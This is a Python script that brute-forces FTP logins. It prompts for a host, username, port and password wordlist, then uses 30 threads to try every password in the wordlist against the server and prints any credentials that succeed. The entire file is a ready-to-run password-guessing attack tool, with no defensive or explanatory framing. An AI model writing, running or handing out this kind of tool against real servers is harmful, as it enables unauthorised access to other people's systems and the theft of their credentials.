#!/usr/bin/env python3

"""
 __                        __ _            ___                _____  
 / _|_ __ ___  _ __ ___    / _| | _____  __/ / |_ _   _ _ __  / _ \ \ 
| |_| '__/ _ \| '_ ` _ \  | |_| |/ _ \ \/ / || __| | | | '_ \| | | | |
|  _| | | (_) | | | | | | |  _| |  __/>  <| || |_| |_| | | | | |_| | |
|_| |_|  \___/|_| |_| |_| |_| |_|\___/_/\_\ | \__|\__,_|_| |_|\___/| |
                                           \_\                    /_/ 


"""


import ftplib
from os import read
from typing import DefaultDict
from colorama import Fore, init 
from threading import Thread
import queue

from colorama.initialise import wrapped_stdout
# 
# to get ftp information
#
'''we initialize the FTP server object using ftplib.FTP() 
and then we connect to that host and try to log in, this will raise an exception whenever
the credentials are incorrect, so if it's raised, we'll just return False, and True otherwise'''
#


# initialize the queue
q = queue.Queue()
# number of threads to spawn
n_threads = 30

# host = "192.168.1.113"
# host aderss :: ip or domain
host = (input(f'''{Fore.LIGHTCYAN_EX}Host(İP/domain): {Fore.LIGHTWHITE_EX}'''))
#user = "test"
user = (input(f'''{Fore.LIGHTCYAN_EX}User: {Fore.LIGHTWHITE_EX}'''))

# port of FTP, aka 21 etc.

'''port number where ftp is running'''
#ftp usually runs on port 21 7
# 21/tcp open ftp
#port = 21
port = input(f'''{Fore.LIGHTCYAN_EX}Port([{Fore.RED}ftp]{Fore.LIGHTCYAN_EX}defaulth:21): {Fore.LIGHTWHITE_EX}''')
wordlists = input(f'''{Fore.LIGHTCYAN_EX}Wordlists(defaulth:wordlist_flex.txt): {Fore.LIGHTWHITE_EX}''')
if port == "":
    port = 21


print("""

        ------> options :

""")
print(f'{Fore.LIGHTGREEN_EX}Host(İP/domain): ',host)
print(f'{Fore.LIGHTGREEN_EX}User: ',host)
print(f'{Fore.LIGHTGREEN_EX}port({Fore.RED}ftp){Fore.LIGHTGREEN_EX} ',host)
print(f'{Fore.LIGHTGREEN_EX}Wordlists(defaulth:wordlist_flex.txt): ',wordlists)

def connect_ftp():
    global q
    while True:
        # get the password from the queue
        password = q.get()
        # initialize the FTP server object
        server = ftplib.FTP()
        print("[!] Trying", password)
        try:
            # tries to connect to FTP server with a timeout of 5
            server.connect(host, port, timeout=5)
            # login using the credentials (user & password)
            server.login(user, password)
        except ftplib.error_perm:
            # login failed, wrong credentials
            pass
        else:
            # correct credentials
            print(f"{Fore.GREEN}[+] Found credentials: ")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f"\tPassword: {password}{Fore.RESET}")
            # we found the password, let's clear the queue
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
        finally:
            # notify the queue that the task is completed for this password
            q.task_done()

#wordlists = "" --> defaulth
if wordlists == "":
    wordlists = "wordlist_flex.txt"
    # read the wordlist of passwords
    passwords = open(wordlists).read().split("\n")
    print("[+] Passwords to try -->", len(passwords))
    # put all passwords to the queue
    for password in passwords:
        q.put(password)
    # create `n_threads` that runs that function
    for t in range(n_threads):
        thread = Thread(target=connect_ftp)
        # will end when the main thread end
        thread.daemon = True
        thread.start()
    # wait for the queue to be empty
    q.join()

    #wordlists = ...
else:
    # read the wordlist of passwords
    passwords = open(wordlists).read().split("\n")
    print("[+] Passwords to try -->", len(passwords))
    # put all passwords to the queue
    for password in passwords:
        q.put(password)
    # create `n_threads` that runs that function
    for t in range(n_threads):
        thread = Thread(target=connect_ftp)
        # will end when the main thread end
        thread.daemon = True
        thread.start()
    # wait for the queue to be empty
    q.join()
